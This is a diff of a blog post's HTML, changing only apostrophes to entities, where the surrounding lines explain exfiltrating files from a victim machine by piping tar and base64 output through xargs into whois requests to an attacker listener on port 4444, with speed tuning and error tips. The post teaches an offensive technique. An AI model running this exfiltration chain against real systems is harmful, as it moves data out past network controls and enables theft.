@@ -130,7 +130,7 @@ I enjoy playing code golf, so when I saw the following tweet, I had to try it ou
 </code></pre><p>Now, a lot of respondents mentioned that you could use the <code>/dev/tcp</code> method or <code>awk</code>.</p>
 <blockquote class="twitter-tweet" data-conversation="none" data-lang="en"><p lang="en" dir="ltr">Why whois?<br><br>TCP<a href="https://t.co/6UstTUeJ4M">https://t.co/6UstTUeJ4M</a><br><br>awk<a href="https://t.co/QlCoAXFvKh">https://t.co/QlCoAXFvKh</a><br><br>Much easier and faster!</p>&mdash; Malwrologist (@DissectMalware) <a href="https://twitter.com/DissectMalware/status/1102781062911066112?ref_src=twsrc%5Etfw">March 5, 2019</a></blockquote>
 <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
-<p>While this is awesome and true, and for practicality should be used instead of <code>whois</code>,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can't use either of those and <code>whois</code> is still there.</p>
+<p>While this is awesome and true, and for practicality should be used instead of <code>whois</code>,  it is more about the mental stretch and exercise for me. You never know, there might a situation where you can&rsquo;t use either of those and <code>whois</code> is still there.</p>
 <p>This is the solution I came up with to both increase the file size limit, and add a bit of error correction:</p>
 <p>(Here is my reply: <a href="https://twitter.com/mubix/status/1102780435271176198">https://twitter.com/mubix/status/1102780435271176198</a>)</p>
 <h3 id="first-we-set-up-a-listener">First we set up a listener:</h3>
@@ -149,7 +149,7 @@ I enjoy playing code golf, so when I saw the following tweet, I had to try it ou
 <li><code>tar czf - /bin/*</code>: Create a <code>tar</code> ball using compression(<code>c</code>), and gzip(<code>z</code>) to the file(<code>f</code>) of standard output(<code>-</code>) using all of the files in the <code>bin</code> folder (<code>/bin/*</code>)</li>
 <li><code>base64</code>: Base64 encode that standard output</li>
 <li><code>xargs -I bits</code>: for every line do the following command while replacing the word <code>bits</code> in the command with the contents of the preceding lines (from the base64)</li>
-<li><code>timeout 0.03</code>: This times out the <code>whois</code> command so that it closes the connection because there isn't a response from the other end (it's just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to <code>0.10</code> or similar for doing things across the Internet.</li>
+<li><code>timeout 0.03</code>: This times out the <code>whois</code> command so that it closes the connection because there isn&rsquo;t a response from the other end (it&rsquo;s just capturing packets). This is REALLY fast and only should be used in LAN connections. Set the timeout to <code>0.10</code> or similar for doing things across the Internet.</li>
 <li><code>whois -h 192.168.80.107 -p 4444 bits</code>: Send the <code>bits</code>(which is replaced with the base64 line) <code>whois</code> query to <code>192.168.80.107</code> over port <code>4444</code>.</li>
 </ul>
 <p>What you should see on the attacker side is a bunch of Base64 lines scrolling across the screen.</p>
@@ -165,10 +165,10 @@ I enjoy playing code golf, so when I saw the following tweet, I had to try it ou
 <h3 id="errors">Errors:</h3>
 <ul>
 <li>
-<p>If you receive a <code>base64: invalid input</code> when doing the final step it is most likely that your timeout was too fast and some of the lines didn't transfer completely.</p>
+<p>If you receive a <code>base64: invalid input</code> when doing the final step it is most likely that your timeout was too fast and some of the lines didn&rsquo;t transfer completely.</p>
 </li>
 <li>
-<p>If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you'll see below).</p>
+<p>If you get something like the following you have had some corruption during the transfer. This can happen and does so a lot during such a long transfer (13 MB took 98 minutes as you&rsquo;ll see below).</p>
 </li>
 </ul>
 <pre><code>bin/bash
@@ -183,7 +183,7 @@ tar: Error is not recoverable: exiting now
 <p>One improvement to the speed is the number of bytes you send with each <code>whois</code> request, which is based on the line length of the base64 output with the <code>-w</code> flag. I have been able to increase this to 255 without much trouble like so: <code>base64 -w255</code></p>
 <p>Example:</p>
 <pre><code>tar czf - /bin/* | base64 -w255 | xargs -I bits timeout 0.20 whois -h 192.168.80.107 -p 4444 bits
-</code></pre><p>Even with this speed up sending all of <code>/bin/</code> took 98 minutes using a timeout of <code>0.20</code>. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you'll end up with corrupted data if you go too fast.</p>
+</code></pre><p>Even with this speed up sending all of <code>/bin/</code> took 98 minutes using a timeout of <code>0.20</code>. You can decrease this considerably depending on the network connection you have between the victim and attackerbox, but you need to be careful or you&rsquo;ll end up with corrupted data if you go too fast.</p>
 <p>Size of <code>/bin/</code>:</p>
 <pre><code>root@victim:~# du -h /bin/
 13M     /bin/
